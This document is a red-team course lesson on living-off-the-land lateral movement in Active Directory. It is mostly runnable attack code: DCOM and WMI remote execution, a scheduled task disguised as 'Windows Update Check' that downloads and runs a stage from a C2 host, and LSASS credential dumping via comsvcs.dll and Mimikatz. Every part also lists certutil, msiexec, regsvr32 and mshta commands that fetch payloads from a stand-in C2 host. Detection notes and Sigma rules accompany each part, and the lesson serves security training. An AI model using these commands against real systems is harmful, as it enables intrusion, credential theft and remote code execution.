---
title: "Advanced LOLAD and LOLBAS in Mature Environments"
tags: [red-team, LOLAD, LOLBAS, living-off-the-land, AD, lateral-movement,
  native-tools, WMI, DCOM, RPC, certutil, msiexec, T1218, T1047, T1021.003,
  ATT&CK, evasion, detection, credential-access]
module: 08-RedTeam-03
day: 546
related_topics:
  - ADCS Advanced (Day 545)
  - Three-Zone Pivoting (Day 547)
  - LOLAD Living Off The Land (Day 518)
  - Lateral Movement Advanced (Day 498)
  - Advanced Evasion AV Bypass (Day 519)
---

# Day 546 — Advanced LOLAD and LOLBAS in Mature Environments

> "In a mature environment, every dropped executable triggers an alert.
> Every PowerShell with an encoded command fires a rule. The answer is not
> better obfuscation — the answer is using what is already installed.
> Active Directory itself is a command-and-control framework if you know
> which levers to pull. Your implant is just one node in a network of
> legitimate administrative tools. Blend in."
>
> — Ghost

---

## Goals

Execute lateral movement using only native Windows and AD tools — no dropped
executables.
Use WMI, DCOM, scheduled tasks, and MMC as lateral movement primitives.
Access LSASS without Mimikatz using built-in Windows tools.
Use certutil, msiexec, and regsvr32 for payload delivery without custom loaders.
Enumerate and detect all of the above from the blue team perspective.

**Prerequisites:** Day 518 (LOLAD intro), Day 541 (EDR evasion), lateral
movement experience from Offshore labs.
**Time budget:** 5 hours.

---

## Part 1 — DCOM for Lateral Movement (T1021.003)

```
DCOM (Distributed Component Object Model) allows Windows COM objects to be
instantiated on remote machines and executed.

Why DCOM for lateral movement:
  → Uses DCE/RPC over port 135 (+ dynamic high ports)
  → No SMB shares required — different network path than PsExec/WMIexec
  → DCOM objects are signed, trusted Windows components
  → Process parent: the DCOM object host (svchost, mmc, outlook — all legitimate)

Common DCOM objects abused for code execution:

  1. ShellWindows ({9BA05972-F6A8-11CF-A442-00A0C90A8F39})
     → Instantiate on remote host → call Navigate() → execute a command via URL:
     \\127.0.0.1\C$\Windows\System32\cmd.exe
     Limitation: requires an Explorer window open on target

  2. ShellBrowserWindow ({C08AFD90-F2A1-11D1-8455-00A0C91F3880})
     → Similar to ShellWindows; older technique

  3. MMC20.Application ({49B2791A-B1AE-4C90-9B8E-E860BA07F889})
     → MMC (Microsoft Management Console) instantiated remotely
     → Call Document.ActiveView.ExecuteShellCommand()
     → Most reliable DCOM lateral movement technique

  4. Excel.Application / Word.Application (Office COM objects)
     → Available on hosts with Office installed
     → Run macros or commands via Excel COM APIs
```

### MMC DCOM Lateral Movement

```powershell
# On attack host (via Sliver/implant PowerShell or evil-winrm):
# Instantiate MMC20.Application on TARGET-HOST as current user

$com = [activator]::CreateInstance([type]::GetTypeFromProgID(
    "MMC20.Application", "TARGET-HOST.corp.local"))

# Execute a command via the MMC object's ActiveView:
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",                           # application
    $null,                               # directory
    "/c whoami > C:\Windows\Temp\out.txt", # parameters
    "7"                                  # window state (7 = minimized)
)

# Read output:
$com.Document.ActiveView.ExecuteShellCommand(
    "powershell.exe",
    $null,
    "-c Get-Content C:\Windows\Temp\out.txt",
    "7"
)
```

```python
# Python equivalent using impacket-dcomexec:
proxychains impacket-dcomexec \
    corp.local/your_user:'pass'@TARGET-HOST.corp.local \
    'whoami > C:\Windows\Temp\out.txt' \
    -object MMC20 -nooutput

# Other object options: ShellWindows, ShellBrowserWindow
proxychains impacket-dcomexec \
    corp.local/your_user:'pass'@TARGET-HOST.corp.local \
    'calc.exe' \
    -object ShellWindows
```

```
Detection:
  Sysmon Event ID 3: Network connection from MMC.exe (mmc.exe) to port 135
  Sysmon Event ID 1: Process created with parent = mmc.exe (abnormal)
  Event ID 4624 + 4648: Network logon from unexpected user to TARGET-HOST

  Sigma:
    EventID: 1
    ParentImage|endswith: '\mmc.exe'
    Image|contains:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
    condition: selection
```

---

## Part 2 — WMI Static Method Execution (Fileless Lateral Movement)

```
WMI lateral movement (beyond wmiexec which drops a semi-persistent service)
using static method calls — cleaner, fileless:
```

```powershell
# WMI Win32_Process.Create — remote code execution via WMI
# Classic technique but frequently blocked now via WMI firewall rules

$wmi = [wmiclass]"\\TARGET-HOST\root\cimv2:Win32_Process"
$wmi.Create("cmd.exe /c whoami > C:\Windows\Temp\o.txt")

# Or via PowerShell with credentials:
$cred = Get-Credential  # or use PSCredential object directly
Invoke-WmiMethod \
    -ComputerName TARGET-HOST \
    -Class Win32_Process \
    -Name Create \
    -ArgumentList "powershell -NoP -W H -c ..." \
    -Credential $cred

# WMI Provider Host (WmiPrvSE.exe) spawns the child process:
# Parent: WmiPrvSE.exe (legitimate WMI process)
# Child: cmd.exe / powershell.exe (suspicious)
```

### WMI Pull vs Push: Pulling Output Without Writing to Disk

```powershell
# Run a command on remote host and pull the output via WMI (no file write):

# Start the process and capture PID:
$proc = Invoke-WmiMethod -ComputerName TARGET-HOST \
    -Class Win32_Process -Name Create \
    -ArgumentList 'cmd.exe /c ipconfig'

# Wait for it:
Start-Sleep -s 2

# Pull stdout via WMI (tricky — requires registry staging):
# Alternative: use impacket-wmiexec which handles I/O through SMB share
# But for fileless: output goes to a WMI property stored in-memory:
# → Use $wmi.GetOwner() on the process object to verify execution
```

---

## Part 3 — Scheduled Tasks as Lateral Movement

```
Scheduled tasks via COM (not schtasks.exe — fewer artefacts):
```

```powershell
# Create a scheduled task on a remote host without schtasks.exe process creation
# Uses Task Scheduler COM object directly

$TaskService = New-Object -ComObject Schedule.Service
$TaskService.Connect("TARGET-HOST", "your_user", "corp.local", "pass")

$TaskDefinition = $TaskService.NewTask(0)
$TaskDefinition.RegistrationInfo.Description = "Windows Update Check"

# Trigger: run once (now + 10 seconds)
$Trigger = $TaskDefinition.Triggers.Create(1)  # 1 = TimeTrigger
$Trigger.StartBoundary = (Get-Date).AddSeconds(10).ToString("yyyy-MM-ddTHH:mm:ss")

# Action: execute command
$Action = $TaskDefinition.Actions.Create(0)  # 0 = Exec
$Action.Path = "powershell.exe"
$Action.Arguments = '-NoP -W H -NonI -c "IEX (New-Object Net.WebClient).DownloadString(\"http://C2/stage\")"'

# Register
$TaskFolder = $TaskService.GetFolder("\")
$TaskFolder.RegisterTaskDefinition(
    "WindowsUpdateCheck",
    $TaskDefinition,
    6,       # TASK_CREATE_OR_UPDATE
    "SYSTEM",
    $null,
    5        # TASK_LOGON_SERVICE_ACCOUNT
)

# Cleanup after execution:
$TaskFolder.DeleteTask("WindowsUpdateCheck", 0)
```

```
Detection:
  Event ID 4698: Scheduled Task Created (on TARGET-HOST)
  Sysmon Event ID 1: PowerShell process with Task Scheduler as parent
  
  Note: using COM (Schedule.Service) avoids schtasks.exe process creation
  but Event ID 4698 still fires — it is logged by the task scheduler service
  regardless of the creation method
```

---

## Part 4 — LSASS Access Without Mimikatz

```
Objective: dump LSASS credentials without dropping Mimikatz.exe
  (flagged by every AV/EDR within seconds of touching disk)

Option 1: Task Manager (GUI — requires RDP session)
  → Open Task Manager → Details tab → Right-click lsass.exe → Create dump file
  → Dump saved to %TEMP%\lsass.DMP
  → Copy off and process with Mimikatz locally

Option 2: comsvcs.dll MiniDump (LOLBin — T1003.001)
  → comsvcs.dll is a legitimate Windows DLL
  → Has an exported function MiniDump that creates process memory dumps
  → Invoke via rundll32 (no custom tool needed)
```

```powershell
# comsvcs.dll LSASS dump — no Mimikatz on target

# Find LSASS PID:
$lsass_pid = (Get-Process lsass).Id

# Dump LSASS memory to disk:
rundll32 C:\Windows\System32\comsvcs.dll MiniDump `
    $lsass_pid C:\Windows\Temp\lsass.dmp full

# Or as a one-liner:
$pid = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $pid `
    $env:TEMP\lsass.dmp full

# Copy the dump file to attack host:
# Via C2 download OR via SMB:
copy C:\Windows\Temp\lsass.dmp \\ATTACK-HOST\share\

# Process the dump on attack host with Mimikatz (locally, not on target):
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" `
    "sekurlsa::logonpasswords" "exit"
```

```
Option 3: NanoDump (more OPSEC-friendly)
  → Creates a "fake" minidump with a modified signature
  → Bypasses LSASS protection better than comsvcs.dll
  → Requires dropping a binary — less LOLBIN but smaller footprint than Mimikatz

Option 4: Impacket secretsdump (no LSASS access needed)
  → Requires domain admin or local admin credentials
  → Dumps remotely via DCE/RPC without touching LSASS process on target:
  proxychains impacket-secretsdump corp.local/admin:'pass'@TARGET-HOST

Detection:
  Sysmon Event ID 10 (ProcessAccess):
    TargetImage: lsass.exe
    GrantedAccess: 0x1010 or 0x1FFFFF (common dump access masks)
  Event ID 4656: Handle to lsass.exe requested

  Sigma (comsvcs.dll):
    EventID: 1
    Image|endswith: '\rundll32.exe'
    CommandLine|contains: 'comsvcs'
    CommandLine|contains: 'MiniDump'
```

---

## Part 5 — certutil, msiexec, and regsvr32 for Payload Delivery (T1218)

```
These are Windows-signed binaries used by defenders for legitimate tasks.
They can also fetch and execute code:

certutil.exe (T1105, T1140):
  Download a file from the internet or internal server:
  certutil -urlcache -split -f http://C2/payload.exe C:\Temp\payload.exe
  
  Decode a base64 file (useful for AV bypass):
  certutil -decode encoded.txt payload.exe

  OPSEC: certutil logs downloads to the web cache
  Detection: Sysmon Event ID 1 with certutil.exe + -urlcache/-f flags

msiexec.exe (T1218.007):
  Execute an MSI payload from a URL:
  msiexec /q /i http://C2/payload.msi
  
  Execute from UNC path:
  msiexec /q /i \\C2\share\payload.msi
  
  OPSEC: MSI execution creates a new process; AV may scan the MSI
  Detection: Sysmon Event ID 1 — msiexec with /i and HTTP/UNC path

regsvr32.exe (T1218.010 — Squiblydoo):
  Execute a remote scriptlet (.sct):
  regsvr32 /s /n /u /i:http://C2/payload.sct scrobj.dll
  
  The .sct file is an XML-based COM scriptlet — can contain JScript/VBScript
  OPSEC: heavily flagged today; was effective 2016–2020
  Detection: Sysmon Event ID 1 — regsvr32 with scrobj.dll and a URL

mshta.exe (T1218.005):
  Execute a remote HTA (HTML Application):
  mshta http://C2/payload.hta
  Or: mshta "javascript:new%20ActiveXObject('WScript.Shell').Run(...)"
  Detection: mshta.exe making network connections; spawning child processes

wscript.exe / cscript.exe:
  Execute VBScript or JScript from a URL:
  wscript //E:vbscript http://C2/payload.vbs
  Or run a local .vbs/.js file that pulls the real payload
```

---

## Exercises

1. Use MMC20.Application DCOM to execute a command on a remote lab Windows
   host. Capture Sysmon Event ID 1 showing mmc.exe as the parent of cmd.exe.
   Write the Sigma rule that detects this parent-child relationship.
2. Dump LSASS using the comsvcs.dll MiniDump technique on a lab Windows VM.
   Copy the dump to your attack host. Process it with Mimikatz locally to
   extract credentials. Verify Sysmon Event ID 10 captured the LSASS access.
3. Use certutil to download a file from your attack host's HTTP server to a
   lab Windows VM. Check the certutil URL cache afterwards
   (`certutil -urlcache`). Write a Sigma rule for this.
4. Execute a scheduled task on a remote lab Windows host using the Schedule.Service
   COM approach (no schtasks.exe). Verify Event ID 4698 fires. Then delete the
   task and verify Event ID 4699 (Task Deleted) fires.
5. Compare the detection artefacts from three lateral movement techniques:
   impacket-wmiexec, DCOM MMC20, and COM-based scheduled task. List which
   Sysmon Event IDs fire for each and rank them by stealth (most to least
   detectable from a standard Sysmon config).

---

## Key Takeaways

1. The LOL (Living Off the Land) philosophy is not about avoiding tools — it is
   about avoiding unusual tools. Every binary used in this lesson is signed by
   Microsoft and present on every Windows installation. They are trusted by
   default; the attacker borrows that trust.
2. DCOM lateral movement via MMC20.Application produces a different process
   parent chain than WMI or PsExec. Defenders who only alert on cmd.exe as
   child of WmiPrvSE miss the DCOM path. Every lateral movement technique has
   a distinct signature.
3. LSASS dumping via comsvcs.dll is the most widely used credential dumping
   LOLBin technique in post-2020 red team engagements — Mimikatz on disk is
   too noisy. The dump is still created on disk (a transient file), so the
   defence is LSASS access monitoring (Sysmon ID 10), not process monitoring.
4. Schedule.Service COM for remote task creation produces the same Event ID
   4698 as schtasks.exe — the logging happens at the task scheduler service
   level, not the process creation level. Using COM avoids one Sysmon process
   creation event but not the Windows event log entry.
5. "LOLBAS for payload delivery" (certutil, msiexec, mshta) became heavily
   detected after 2018 as every EDR added specific rules. The value today is
   not evasion — it is understanding the detection surface so you know which
   technique to choose based on the specific sensor deployed on the target.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q546.1, Q546.2 …).

---

## Navigation

← Previous: [Day 545 — ADCS Advanced](DAY-0545-ADCS-Advanced-ESC4-ESC6.md)
→ Next: [Day 547 — Three-Zone Pivoting and Deep Network Navigation](DAY-0547-Three-Zone-Pivoting-Deep-Network.md)
